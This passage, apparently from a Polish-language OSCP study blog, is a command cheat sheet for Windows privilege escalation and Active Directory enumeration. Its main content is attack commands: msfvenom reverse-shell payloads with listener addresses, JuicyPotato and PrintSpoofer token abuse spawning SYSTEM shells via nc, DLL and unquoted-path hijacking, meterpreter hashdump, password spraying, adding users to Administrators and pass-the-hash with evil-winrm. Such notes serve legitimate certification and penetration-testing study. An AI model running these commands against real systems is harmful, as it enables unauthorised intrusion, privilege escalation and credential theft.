[/path/to/unquoted/folder] -accepteula<br>#3: Generate reverse shell payload and rename to path e.g. A.exe<br>#4: Place malicious binary in path, so that it is executed e.g. move A.exe „C:\Program Files\folder”.<br>#5: Execute by restarting computer (if service has startmode = auto) with shutdown /r /t 0.<br><strong><mark style="background-color:#fd9eff" class="has-inline-color">###oscp23###</mark></strong><br>#Ps: Get-CimInstance -ClassName win32_service | Select Name,State,PathName (listowanie wszystkich programow, malo skuteczne bo duzo wynikow)<br>#CMD: wmic service get name,pathname | findstr /i /v „C:\Windows\\” | findstr /i /v „””   (super, pokazuje wyniki ze sciezka w „”)<br>#sprawdzamy czy mozemy start i stop usluge: Start-Service GammaService    #&gt;   Stop-Service GammaService<br>#&gt;icacls „C:\Program Files\Enterprise Apps” (pamietaj aby dla folderow na koncu nie dawac /)<br>#&gt; znajdujemy miejsce gdzie mamy uprawnienia F lub W do wgrania .exe , przygotowujemy payload (np. skompilowany C do zmiany hasla usera, lub nowy user) i przenosimy na Windows do wskazanego folderu<br>#Start-Service GammaService (GammaService to nazwa uslugi)  (mimo  errorów exe zostanie wykonany)<br><strong>#—. .\PowerUp.ps1</strong><br>#Get-UnquotedService (nie zadzialalo mi a wiec uzylem: Invoke-AllChecks)<br>#automat: Write-ServiceBinary -Name 'GammaService’ -Path „C:\Program Files\Enterprise Apps\Current.exe” (gdzie wskazujemy aby zrobil plik Current.exe)<br>#&gt; restart: Restart-Service GammaService (zadzialalo !! stworzyl usera john)<br><strong>#– MSFvenom na nc 4444</strong><br>#msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.232 LPORT=4444 -f exe -o shell.exe<br><strong>###Tools###</strong><br>#Jaws pokaże (ps. chociaz u mnie słabo)<br>#wmic service get name,displayname,pathname,startmode |findstr /i „auto” |findstr /i /v „c:\windows\” |findstr /i /v „””  (S!ren: z auto to działające usługi ; w cmd! i możesz ewentualnie usunc środkowy find aby pokazywało także w /windows/)<br>#sc query ; sc qc (szukaj wyników z „” lub spacjami)<br>#icacls „C:\Program Files (x86)\UNQUOTED_SERVICE_PATH_SOFTWARE”<br>#czy możesz coś wrzucić do C:\Program Files\<br>#czy możesz coś wrzucić do C:\Program Files\something\<br>#zmień C:\Program Files\something\something.exe na something.exe.BACK i wtedy wrzuć tu swój exe (np. <strong>ren</strong> C:\windows\system32\utilman.exe utilman.exe.bak) a przeniesienie przez polecenie copy.<br><strong>###własny skrypt do unquoted path automat sprawdza:</strong></p>



<pre class="wp-block-code"><code>cd "C:\Windows\TEMP"
sc query state= all | findstr "SERVICE_NAME:" &gt;&gt; ServiceNames.txt
FOR /F %i in (ServiceNames.txt) DO echo %i
type ServiceNames.txt
FOR /F "tokens=2 delims= " %i in (ServiceNames.txt) DO @echo %i &gt;&gt; Services.txt
FOR /F %i in (Services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" &gt;&gt; path.txt
type path.txt</code></pre>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Impersonation" ez-toc-data-id="#Impersonation"></span>Impersonation<span class="ez-toc-section-end"></span></h4>



<p><em>Abuse (nadużycie) is possible if SeImpersonatePrivilege or SeAssignPrimaryPrivilege is enabled</em> (sa tez inne: <em>SeBackupPrivilege, SeAssignPrimaryToken, SeLoadDriver i SeDebug.</em> <a href="https://github.com/gtworek/Priv2Admin">Tworek</a> o uprawnieniach)<br>#Print Nightmare : whoami /priv #&gt; SetImpersonatePrivilege Enabled?<br>#JuicyPotato.exe -p C:\inetpub\wwwroot\nc.bat -l 443 -t * <br>#.\JuicyPotato.exe -p C:\users\chris\met.exe -l 1337 -t * -c „{4991d34b-80a1-4291-83b6-3328366b9097}” (czesto domyslny CLSID narzedzia nie dziala i trzeba probowac z <a href="https://ohpe.it/juicy-potato/CLSID/">tej</a> listy), warto tez uzyć GetCLSID.ps1 aby sprwdzi jakie sa na maszynie  ;  jak w/w .ps1 wygeneruje ci liste to tym narzedziem mozesz sprawdzic: test_clsid.bat<br>#.\PsExec64.exe -i -u „nt authority\local service” cmd.exe -accepteula<br><strong>###JuicyPotatoNg – działa kiedy inne zawodzą###</strong><br>#.<mark style="background-color:#ffa9b8" class="has-inline-color">\JuicyPotatoNG.exe -t * -p .\met.exe  </mark><br>#.\JuicyPotatoNG.exe -t * -p “C:Windows\system32.cmd.exe” -a “/c whoami &gt; C:\juicy.txt”<br><strong>###PrintSpoofer (Windows 10 and Server 2016/2019)###</strong><br><em>Leverages the Print Spooler service to get a SYSTEM token, then run a custom command</em>. Jeżeli jest podatnośc to poniższe zadziała:<br>#printspoofer32.exe -i -c cmd (spawn a SYSTEM command prompt ; PS. mi działała wersje 32)<br>#printspoofer32.exe -c „C:\temp\nc.exe [LHOST] [LPORT] -e cmd.exe” (get a SYSTEM reverse shell)<br>#whoami (czy jesteś nt authority \ system i możesz dodać usera i do grupy admin)<br><strong>#– <a href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a> by oscp23</strong><br>#w prawdziwych pentestach: usługi IIS będą działać jako LocalService, LocalSystem, NetworkService lub ApplicationPoolIdentity, z których wszystkie mają przypisany SeImpersonatePrivilege<br>#whoami /priv<br>#przenosimy PrintSpoofer64.exe<br>#&gt; .\PrintSpoofer64.exe -i -c powershell.exe (i bedziemy: nt authority\system)<br>#.\PrintSpoofer64.exe -i -c „powershell -e PAYLOAD (payload zrobilem ze strony reshells Powershell base64 – super midzialalo na Medtech, gdie user mial whoami /priv: SeImpersonatePrivilege)<br><strong>###Tools##</strong>#<br>#Jaws sprawdź czy coś znalazł<br><strong>###MSF###</strong><br>#sprawdzanie czy atak zadziała: w meterpreter getprivs lub chyba whoami /priv też zadziała: czy jest SeImpersonatePrivilege<br>#&gt;meterpreter: load incognito (w sumie to wszystko) #&gt; teraz powinno zadziałać: list_tokens -u &gt; pokaże się lista nazw tokenów delegation lub impersonation #&gt; impersonate_token „$Nazwa_z_w/w_listy” #&gt; getuid (sprawdzenie) #&gt; ps #&gt; migrate 3544 #&gt; hashdump #&gt; dostęp do Users\Administrator<br>#Print Nightmare : whoami /priv #&gt; SetImpersonatePrivilege Enabled?<br>#JuicyPotato.exe -p C:\inetpub\wwwroot\nc.bat -l 443 -t * -c<br><strong>###PrintSpoofer (Windows 10 and Server 2016/2019)###</strong><br><em>Leverages the Print Spooler service to get a SYSTEM token, then run a custom command</em>. Jeżeli jest podatnośc to poniższe zadziała:<br>#printspoofer32.exe -i -c cmd (spawn a SYSTEM command prompt ; PS. mi działała wersje 32)<br>#printspoofer32.exe -c „C:\temp\nc.exe [LHOST] [LPORT] -e cmd.exe” (get a SYSTEM reverse shell)<br>#whoami (czy jesteś nt authority \ system i możesz dodać usera i do grupy admin)</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Siec" ez-toc-data-id="#Siec"></span>Sieć:<span class="ez-toc-section-end"></span></h4>



<p>#ipconfig /all (pokaże też domene i DNS serwer – często Kontroler D.)<br>#netstat -ano (Estabished to aktulnie podlaczeni userzy)<br>#route print<br>#arp -A  (lub -a)<br>#ipconfig /all<br>#net share ; net use ; net start<br>#nslookup IP (lub zamiast IP dać DC01.corp.com, czasami z .exe)<br>#!! jak znajdziesz cos na lokalnym porcie i zrobsz tunelowanie to wyprobuj: proxychains curl http://10.10.1.1:40000   ALE TEZ    proxychains nc 10.10.1.1 40000 – bo tak czasami moznauruchomic uslugi.<br><strong>###PS###</strong><br>#Get-NetIPConfiguration<br>#Get-DnsClientServerAddress<br>#Get-NetRoute<br>#Get-NetNeighbor<br><strong>###MySQL###</strong><br>#C:\xampp\mysql\bin&gt;mysql.exe -uroot -p<br><strong>###Plink – otwieranie lokalnych portów np. 445 by TCM###</strong><br>#pliki .exe do pobrania z <a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">tej</a> strony<br>#ps. patrz na TUNELOWANIE w OSCP</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Kernel" ez-toc-data-id="#Kernel"></span>Kernel:<span class="ez-toc-section-end"></span></h4>



<p>#<a href="https://github.com/SecWiki/windows-kernel-exploits">Github</a> z bazą exploitów Kernel na Windows<br>#MS16-135: Pobierz: https://raw.githubusercontent.com/SecWiki/windows-kernel-exploits/master/MS16-135/41015.c  #&gt;  Kompilacja na 64: i686-w64-mingw32-gcc exploit.c -o exploit.exe   LUB  kompiacja na 32:  i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32  #&gt;  wykonanie na Win: .\exploit.exe</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Registry" ez-toc-data-id="#Registry"></span>Registry<span class="ez-toc-section-end"></span></h4>



<p>#regedit.exe i <a href="https://3haker.pl/rejestr-windows-legenda-regedit-exe/">objasnienie</a> drzewa rejestru<br>#Patrz: Autorun, AlwaysElevated itd.</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="RunAs" ez-toc-data-id="#RunAs"></span>RunAs:<span class="ez-toc-section-end"></span></h4>



<p><em>na maszynie na której jestesmy odpalamy cos jaki inny user do ktorego mamy credsy np. mozesz nc.exe z revshell lub met.exe robiacy rev-shell</em></p>



<p>#runas /user:corp\offsec cmd.exe<br>#runas /savecred /user:admin C:\Temp\reverse.exe  (Transfer the reverseshell)<br>#cmdkey /list (sprawdza czy na maszynie sa zapisane credsy Adminsitratora) #&gt; C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred „C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\proof.txt &gt; C:\Users\offsec\proof.txt”   (by TCM)</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Startup_Applications" ez-toc-data-id="#Startup_Applications"></span>Startup Applications<span class="ez-toc-section-end"></span></h4>



<p>#xx</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="DLL_Hijacking" ez-toc-data-id="#DLL_Hijacking"></span>DLL Hijacking:<span class="ez-toc-section-end"></span></h4>



<p>#WinPEAS moze nam podpowiedziec 1) ze mamy prawo zapisu do folderow w ktorych szuka sie domyslnie .dll (Application path or directory #&gt; C:\Windows\System32 #&gt; C:\Windows\System #&gt; C:\Windows #&gt; C:\Program Files #&gt; The PATH environment variable)  ORAZ do ktorych binarem mozemy nadpisac.<br>#&gt; Uzyj softu Proces Monitor np. Procmon z Sysinternals aby poznać pobierane .dll (filts: PAth &gt; ends with &gt; .dll  &gt; then Include &gt; button Apply)  (alternatywnie zrob na Kalim strings na binarke). <br>#&gt; pokaze ci nazwe poszukiwanej binarki i gdzie szuka<br>#&gt; msfvenom -p windows/x64/shell_reverse_tcp<br>LHOST= LPORT=PORT -f dll &gt; hijackme.dll<br>#&gt; sc stop $usluga-z-dll<br>#&gt; sc start $usluga-z-dll<br>###TCM###<br>#sc stop dllsvc  #&gt;  sc start dllsvc   aby uruchomic<br><strong><mark style="background-color:#f1a8ff" class="has-inline-color">###oscp23###</mark></strong><br>#bez bezpiecznego trybu najpierw szuka dll: folder aplikacji &gt; biezacy folder || z bezpiecznym trubem bieżący folder odchodzi na koniec<br>#wciskamy do brakujących przy wykonaniu aplikacji .dll<br>#podobnie jak w .exe szukamy binarek do ktorych mamy prawo: Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running’}<br># icacs „TU-sciezka-do-exe”<br># musimy użyć narzędzia do moniorowania procesów aby zlokalizować DLL z których korzysta w/w exe np. <strong>Procmon64.exe </strong>(ale taki program moze wlaczyc tylko Administrator ; w pentestach kopiowanie .exe na inna maszyne lokalna i tam sprawdzenie dll  ;  ps. ale probuj tez „procexp64.exe” bo mi poszlo na slabym userze) <br>#&gt; filtr: Process name is NazwaAplikacji.exe #&gt; lista jest pusta i musimy zrestartować usługę PS: Restart-Service BetaService (gdzie BetaService to nazwa usługi) #&gt; teraz jest dużo procesów patrz na Operation: CreateFile (ja sobi dodałem filte) #&gt; znalazł MyDLL.dll z info o braku znalezienia „NAME NOT FOUND”, parz tez kolejnosc szukania od gory <br>#&gt; PS: $env:path <br>#&gt; <a href="https://3haker.pl/kod-dll-w-c-do-kompilacji/">kod DLL</a> w C do kompilacji <br>#&gt; x86_64-w64-mingw32-gcc dll.c –shared -o myDLL.dll <br>#&gt; wrzucamy .dll do odpowiedniego folderu  <br>#&gt;  Restart-Service BetaService i mamy wykonanie kodu<br>#—<br>#msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.1.3 lport=8888 -f dll &gt; shell.dll</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="WSL" ez-toc-data-id="#WSL"></span>WSL:<span class="ez-toc-section-end"></span></h4>



<p><em>Czyli na Windowsie moze miec odpalonego Linuxa</em></p>



<p>#mount -t drvfs C: /mnt/test  (Adamski musial podlaczyc dysk aby uciec z WSL w terminalu Windows  ;  wcześniej sprawdzał na linux czy ma /etc/wsl.conf i przez cat czy: [automount]  ;  korzystal z <a href="https://medium.com/@gulfsteve/hacking-with-wsl2-ede3e649e08d">tego</a> poradnika)<br><strong>###by TCM###</strong><br>#niby jestes na Windows ale jak zrobisz „whoami” to bedzie ze „root”<br>#uname -a i oprócz Linux powinien byc tez Microsoft</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Tools" ez-toc-data-id="#Tools"></span>Tools<span class="ez-toc-section-end"></span></h4>



<p>#winpeas, tutaj <strong>lab</strong><br>#windows-privesc-check i <a href="https://3haker.pl/automated-enumeration-windows-privesc-check/">oscp</a> opis: windows-privesc-check2.exe –dump -G (dla listy Grup)<br>#<a href="https://github.com/61106960/adPEAS">adPEAS</a><br><strong>###Accesschk.exe###</strong><br>#<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk">pobrać</a> z tej strony plik .exe ok 1MB: https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk<br>#przejść do folderu w którym jest i odpalać: ./accesschk.exe Komenda<br>#Certify.exe find /vulnerable /currentuser<br>#Certify.exe find (w cmd.exe)<br><strong>###PowerUp###</strong><br>#cmd&gt; powershell -executionpolicy bypass<br>#PS&gt; Import-Module C:\temp\powerup.ps1<br>#PS&gt; Invoke-AllChecks<br>#&gt;Get-ModifiableServiceFile (pokaze binarki ktore user moze modyfikowac)<br>#czasami domyślnie robi konto i dodaje jako administratora: john / Password123!<br><strong>###jaws_enum.ps1###</strong><br>#powershell -ep bypass<br>#.\jaws_enum.ps1 -OutputFilename jaws-enum.txt<br><strong>###winpeas.bat – kiedy exe nie dziala np. jak nie ma na.NET v4###</strong><br>#winpeas.bat  (.bat jednak daje mniej niz exe!!) i win_enum.bat świetnie działają, odpal przez cmd<br>#na Kalin wszystkie binarki na 64 i 32 i obsucated sa w:  /opt/PEASS-ng/binaries/<br>#oscp23 pobranie z kaliego binarki: PS: iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe<br>#szukaj w wynikach winpeas: transcripts history, NTLM, Current user fajnie pokazuje userow i ich grupy, password files  i inne na czerwono<br>#oscp23 poleca też uruchomic: ./Seatbelt.exe -group=all<br><strong>###Sherlock.ps1 i Watson.exe###</strong><br>#szukaja typowych podatności CVE<br>#import-module .\Sherlock.ps1 #&gt; Find-AllVulns<br>#cmd: Watson.exe<br>#import-module ./Invoke-Watson #&gt; invoke-watson<br>#jak Watson wykryje CVE-2019-1388 to możesz eskalacja wg <a href="https://github.com/jas502n/CVE-2019-1388">github</a> i <a href="https://3haker.pl/udemy-kurs-active-directory/">opis</a> (bedziesz mógł dodac nowego usera jako lokalnego admina)<br><strong>###PowerCat.ps1###</strong> <a href="https://github.com/besimorhino/powercat/blob/master/powercat.ps1">instr</a><br>#import-module .\powercat.ps1<br>#&gt; powercat -l -p 443 -Verbose<br><strong>###PsExec###</strong><br>#psexec.py Administrator@$IP cmd.exe (odpalamy z Kaliego, chcemy uruchomić cmd.exe na Windowsie, musi mieć SMB i musimy znać hasła, lub hash)<br>#psexec.py offsec:lab@$IP   (wersja z haslem, ale da tylko info o userze)<br>#w msfconsole jest też: exploit/windows/smb/psexec<br>#jak psexec .py nie działa to spróbuj: <strong>smbexec.py</strong>  LUB  <strong>winexec.py</strong><br><strong>###windows-exploit-syggester.py NG###</strong><br>#nowa wersja bo stara ie wspirana: wes.py z <a href="https://github.com/bitsadmin/wesng">git</a><br>#Na Kalim: wes.py –update  #&gt;    systeminfo &gt; systeminfo.txt (na Windows  lub po prostu skopiuj zawartość) #&gt;  ./wes.py sysinfo.txt  LUB  ./wes.py -e sysinfo.txt</p>



<h2 class="wp-block-heading"><span class="ez-toc-section" id="Active_Directory" ez-toc-data-id="#Active_Directory"></span><strong>Active Directory</strong><span class="ez-toc-section-end"></span></h2>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Podstawy-2" ez-toc-data-id="#Podstawy-2"></span>Podstawy<span class="ez-toc-section-end"></span></h4>



<p><br>#xfreerdp /u:stephanie /d:corp.com /v:$IP<br>#<mark style="background-color:#b9ffa9" class="has-inline-color">rdesktop $IP</mark> – od azu poznasz domene i OS<br>#skrypt enumeration.ps1 (albo w Powershell ISE ; <mark style="background-color:#f39fff" class="has-inline-color">oscp23</mark>) który odpalamy powershell -ep bypass i który robi nam ścieżke do LDAP (na wzór: LDAP://DC1.corp.com/DC=corp,DC=com) i listuje wszystkie obiekty (ps a <a href="https://3haker.pl/skrypt-do-listowania-wszystkich-obiektow-ad/">tutaj</a> bardziej robudowana wersja) – taki własny zalążek PowerView.</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Domena_i_kontroler_domeny" ez-toc-data-id="#Domena_i_kontroler_domeny"></span>Domena i kontroler domeny<span class="ez-toc-section-end"></span></h4>



<p>#Zwykle polecenie Powershell (nie jako administrator): sprawdza domene i maszyne Kontrolera domeny: <strong><mark style="background-color:#c5ffb8" class="has-inline-color">[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</mark></strong><br>#Ps: Get-AdDomain (SID domeny)<br>#PS: Get-AdDomainController<br>#dig @$IP medtech.com any (sprawdzi czy sa subdomeny)<br><strong>###O domenie###</strong><br>#<mark style="background-color:#c4ffb7" class="has-inline-color">Get-NetDomain</mark> (osp23)<br>#Get-NetDomain -Domain corp.com<br>#Get-Domain (pokaże domen główną i adres kontrolera domeny)<br>#Get-ForestGlobalCatalog (przy okazji jest IP kontrolera domeny)<br>#Get-DomainSID<br>#Get-DomainPolicy<br>#Get-NetForestDomain -Verbose | Get-DomainTrust<br>#Get-NetForest (opcjonalnie z : -Forest $nazwa_forestu)<br><strong>###Kontroler domeny###</strong><br>#Szukaj IP Kontrolera Domeny: nslookup.exe DC01.corp.com (lub bez .exe) #&gt; Remote Desktop aplikacja<br>#<mark style="background-color:#c7ffba" class="has-inline-color">Get-NetDomainController</mark><br>#Get-NetDomainController -Domain corp.com (z określeniem domeny, bo może być kilka)<br>#spóbuj czy masz dostęp do Kontrolera Domeny: PsExec.exe \DC01 cmd.exe (może z: -i -s)</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Users" ez-toc-data-id="#Users"></span>Users:<span class="ez-toc-section-end"></span></h4>



<p>#Sprawdzanie swoje <strong>SID</strong> najszybciej przez : <mark style="background-color:#cbffbf" class="has-inline-color">whoami /all</mark> ALE chyba lepiej przez <mark style="background-color:#c8ffbc" class="has-inline-color">Get-DomainUser -SamAccountName offsec</mark> (bo okazuje sie że jest wtedy inne SID) (lub <strong>-Name</strong> zamiast -SamAccountName)<br>#net user ; net user /domain ; net user NAZWA_USERA /domain (zwróć uwage na komentarze do userów)<br>#PS: Get-ADUser -Filter * -Identity offsec -Properties *<br>#PS: Get-ADGroup -Filter *<br>#net user $nazwa-usera #&gt; sprawdz co ma w polu serviceprincipalname<br>#<mark style="background-color:#ccffc0" class="has-inline-color">impacket-GetADUsers -all -dc-ip ip domain.com/user</mark>  (z kaliego)<br><strong>###Userzy###</strong><br>#Get-NetUser (oscp23  ;  PowerView)<br>#Get-NetUser | select samaccountname,lastlogon<br>#Get-NetUser | select cn  (same loginy pokaze)<br>#<mark style="background-color:#b8ffa8" class="has-inline-color">Get-NetUser | select cn,pwdlastset,lastlogon</mark> (oscp23 ; kiedy zmienili swoje haslo i kiedy ostatnio sie logowali)<br>—<br>#Get-UserProperty -Properties pwdlastset (Check last password change)<br>#Get-DomainUsers (pokaże wszystkich userów w domenie z ich przynależnością do grup memberoff)<br>#Get-DomainUser -Name $nazwausera<br>#Get-DomainUser -Properties samaccountname,memberof<br>#Get-DomainUser -Properties samaccountname,description<br>#Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties Name,SamAccountName,Description | Sort Name<br>#Get-DomainUser -SPN | select Name,SrvicepPincipalnNme (Get kerberoastable users)<br>#Get-DomainUser -Properties samaccountname,description | Where {$_.description -ne $null} (userzy z opisami)<br><strong>###zalogowani###</strong><br>#<mark style="background-color:#b3ffa2" class="has-inline-color">PsLoggedon.exe \ \DC01</mark> (lepszy sposób sprawdzania sesji na konkretnej maszynie ; sysinternals)<br>#Get-NetSession -ComputerName DC01 -Verbose (oscp23, sesje userów na konkretnej maszynie, ale w nowszych Windowsach od późnego 10 nie działa)<br>#Get-NetLoggedon -ComputerName DC01 (Enumerate user logged on a machine)<br>#Find-DomainUserLocation -Domain corp.com | Select-Object UserName, SessionFromName (List machines in domain where specific users are logged into)<br><strong>###persmission###</strong><br>#<mark style="background-color:#b0ff9e" class="has-inline-color">Find-LocalAdminAccess -Verbose</mark> (sprawdzanie mojego aktualnego usera na jakich maszynach ma prawa lokalnego administratora)<br>#Find-LocalAdminAccess  (czy nasz bieżący użytkownik ma uprawnienia administracyjne na komputerach w domenie  #&gt;  PsExec.exe \\client74 cmd.exe)<br>#Invoke-EnumerateLocalAdmin -Verbose (Find local admins on all machines of the domain)<br>#Invoke-UserHunter -Stealth (Find computers were a Domain Admin OR a specified user has a session)<br>#Invoke-UserHunter -ShowAll (Find computers where domain administrators or specified user / group has session)<br>#Invoke-UserHunter -CheckAccess (Confirming admin access)<br>#——user hunting<br>#Find-LocalAdminAccess -ComputerDomain -Verbose<br>#Invoke-EnumerateLocalAdmin –Verbose (Find local admins on all machines of the domain (needs local admin rights on target))<br>#Test-AdminAccess -Verbose (pokazuje gdzie ten user ma admin access)<br>#Find-DomainLocalGroupMember –Verbose (Find local admins on all machines of the domain, must be local admin)<br><strong>###dodanie usera###</strong><br>#<mark style="background-color:#c5ffb8" class="has-inline-color">net user lukasz Password123 /add</mark> (czasami z PS trzeba dodać przedrostek: cmd.exe /c )<br>#<mark style="background-color:#c7ffba" class="has-inline-color">net localgroup „Remote Desktop Users” lukasz /add</mark><br>#<mark style="background-color:#cdffc2" class="has-inline-color">net localgroup „Remote Management Users” lukasz /add</mark><br>#crackmapexec smb 192.168.235.221 -u Administrator -p Password123 –local-auth -x „<mark style="background-color:#fff79e" class="has-inline-color">net localgroup Administrators SKYLARK\kiosk /add</mark>„<br>#net group „Backup Operators” lukasz /add /domain (dla grup w domenie musi być z /domain na końcu)<br><strong>###zmiana hasła usera###</strong><br>#<mark style="background-color:#d0ffc5" class="has-inline-color">net user Administrator Password123</mark> <br>#net user offsec Password123 /domain (zmiana hasła sobie lub innemu userowi do którego mamy np. GenericAll, by oscp23)<br>#$Password = ConvertTo-SecureString „Password123” -AsPlainText -Force #&gt; Set-ADAccountPassword -Identity „T2_ROSS.BIRD” -Reset -NewPassword $Password<br>#Invoke-DomainPasswordSpray -PasswordList .\Passwords.txt -Domain -ErrorAction SilentlyContinue (wcześniej: Import-Module DomainPasswordSpray.ps1)<br><strong>###Co zrobić po zmienie hasła##</strong><br>#runas /user:corp\jen powershell.exe<br><strong>###oscp23###</strong><br>#net user /domain (wykorzystujemy domyślnie instalowany net.exe)<br>#net user jeffadmin /domain</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Groups" ez-toc-data-id="#Groups"></span>Groups<span class="ez-toc-section-end"></span></h4>



<p>#<mark style="background-color:#b1ff9f" class="has-inline-color">Get-NetGroup</mark> (oscp23)<br>#net group /domain (ale chyba nie pokaze grup w danej grupie, a tylko userów, lepiej użyć PowerView)<br>#net group „Sales Department” /domain (to .Net więc pokaże tylko osoby bez grup podnależących)<br>#<mark style="background-color:#b5ffa4" class="has-inline-color">Get-NetGroup „Sales Department” | select member</mark> (j.w. ale także pokaże grupy należące do grupy)<br>#PS: Get-ADGroupMember -Identity „Domain Admins” (listowanie wszystkich userów grupy)<br>—<br>#Get-DomainGroup -Identity „Domain Admins” | Select-Object -ExpandProperty Member<br>—<br>#Get-DomainGroup<br>#Get-DomainGroup -Name „Domain admins”<br>#Get-DomainGroup -Username „jenkinsadmin” (w jakich grupach domenowych jest ten user)<br>#Get-DomainGroup -samaccountname $nazwa_grupy (sprawdzamy jej memberof czy nie jest Domain admins)<br>#Get-NetGroup -Properties SamAccountName | Sort SamAccountName<br>#Get-NetGroup –Domain corp.com<br>#Get-NetDomainController | Get-NetLocalGroup | Select -ExpandProperty GroupName | Get-NetGroupMember | Select GroupName,MemberName | Sort GroupName (Get all domain controllers then get each group and list members)<br>#Get-NetLocalGroup -Username 'offsec’ (List Groups of which a user is a member of)<br><strong>###PowerView###</strong><br>#Get-NetUser -TrustedToAuth<br><strong>###Backup Operators (aby zrzucić SAM z DC01)###</strong><br>#ten <a href="https://github.com/mpgn/BackupOperatorToDA">git</a> z komendami i exe<br>#<a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges">hacktricks</a> na lokalne dziala i DC<br>#starsza wersja na <a href="https://github.com/giuliano108/SeBackupPrivilege">git</a> ale gotowe DLL do pobrania<br><strong>###Web Admins – Grupa Domenowa###</strong><br>#chyba musisz mieć swojego usera w grupie WebAdmins która ma prawo ReadGMSApassword ;  Group Managed Service Accounts aby zmienić hasło innego usera do którego grupa ma w/w uprawnienia<br>#ten <a href="https://github.com/rvazarkar/GMSAPasswordReader">git</a> GMSAPasswordReader jest przydatny ale brak exe, plik exe pobierzesz <a href="https://github.com/expl0itabl3/Toolies">tutaj</a><br>#.\GMSAPasswordReader.exe –accountname -offsec (to jest wykonywane na kompie DC akurat, z innego kompa pewnie trzeba dodatkowe przelaczniki dodac)<br>#&gt; ma hashe (to sa te zapisane przy rc4 itp., sprobuj wszystkie)<br>#korzysta ze znalezionych hashy: evil-winrm -u offsec -H $Hash DC01<br><strong>###oscp23###</strong><br>#<mark style="background-color:#baffaa" class="has-inline-color">net group /domain</mark> (zwroc uwage na niestandardowe nazwy grup np. Developer, Sales, Managment)<br>#<mark style="background-color:#afff9d" class="has-inline-color">net group „Sales Department” /domain</mark><br>#w Bloodhound zawsze sprawdzaj dla grupy: Outbound Object Control – czyli co może zmieniac u innych obiektów</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Computers" ez-toc-data-id="#Computers"></span>Computers<span class="ez-toc-section-end"></span></h4>



<p>#net view (get all computers in domain)<br>#PS: Get-ADComputer -Filter * -Properties *<br><strong>###PowerView###</strong><br>#<mark style="background-color:#b1ff9f" class="has-inline-color">Get-NetComputer</mark> (oscp23)<br>#Get-NetComputer -FullData<br>#Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion<br>#<mark style="background-color:#a6ff92" class="has-inline-color">Resolve-IPAddress CLIENT76.corp.com</mark> (zamiana nazwy maszyny na IP by oscp23)<br>#Get-NetSession -ComputerName DC01 -Verbose (oscp23, sesje userów na konkretnej maszynie, ale w nowszych Windowsach od późnego 10 nie działa)<br>#Get-DomainComputer (szukaj wersji OS, jak jest stara to są exploity przez smb) (tylko aktywne z -Ping)<br>#Get-DomainComputer -OperatingSystem „Windows 7*”<br>#Get-DomainComputer -SPN mssql* -Domain corp.com (szuka serwerów MySQL)<br>#Get-DomainComputer -Unconstrained<br>#Get-DomainGPO -ComputerName CLIENT251 (jaka polityka dla komputera konkretnego)<br>#——sesje na innej maszynie<br>#Get-NetLoggedon -ComputerName CLIENT251 (users zalogowani na maszynie CLIENT251 ; można chyba bez określania maszyny)<br>#Get-NetLocalGroup -ComputerName DC01 -Recurse (Get list of effective users who can access a remote host)<br>#Get-LastLoggedOn -ComputerName CLIENT251 (ostatnio zalogowani)<br>#Get-NetSession -ComputerName KONTROLLER _DOMENY (np. dc01)<br>#New-PSSession -ComputerName thmserver1.za.tryhackme.loc #&gt; Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc<br><strong>###Wywołanie komend z innym komputerze###</strong><br>#Invoke-Command -ComputerName DC01 -ScriptBlock(whoami /groups;hostname)<br>#Enter-PSSession -ComputerName DC01</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Shares" ez-toc-data-id="#Shares"></span>Shares<span class="ez-toc-section-end"></span></h4>



<p>#<mark style="background-color:#b1ff9f" class="has-inline-color">net view \\dc01 /al</mark>l   LUB   z IP: net view \ \192.168.195.151 /all<br><strong>###PowerView###</strong><br>#Find-DomainShare -Verbose #&gt; cd \\fileshare.pentesting.local\\Fileshare<br>#sprawdzanie IP wewn subdomeny: nslookup.exe DC01.corp.com (lub bez .exe)<br>#Find-DomainShare -CheckShareAccess (Enumerate Domain Shares the current user has access)<br>#Invoke-FileFinder -Verbose<br>#Get-DomainFileServer -Verbose (Get all file servers on Domain)<br>#Get-NetShare -ComputerName DC01 (List all shares on specific domain system)<br>#Find-InterestingDomainShareFile -verbose (Files!)<br>#Find-InterestingDomainShareFile -Terms account*<em>,pass*</em>,secret*<em>,conf*</em>,test*<em>,salar*</em><br><strong>###tworzenie w cmd udostepnionego folderu w sieci###</strong><br>#mkdir dupa (np. w C:\)<br>#PS: New-SmbShare -Name DupaShare -Path C:\dupa -FullAccess „Everyone”<br><strong>###oscp23###</strong><br>#<mark style="background-color:#aaff97" class="has-inline-color">Find-DomainShare</mark>  (wyswietlenie wszystkich udzialow, takze tych do ktorych nie mampy prawa ; moze zajac 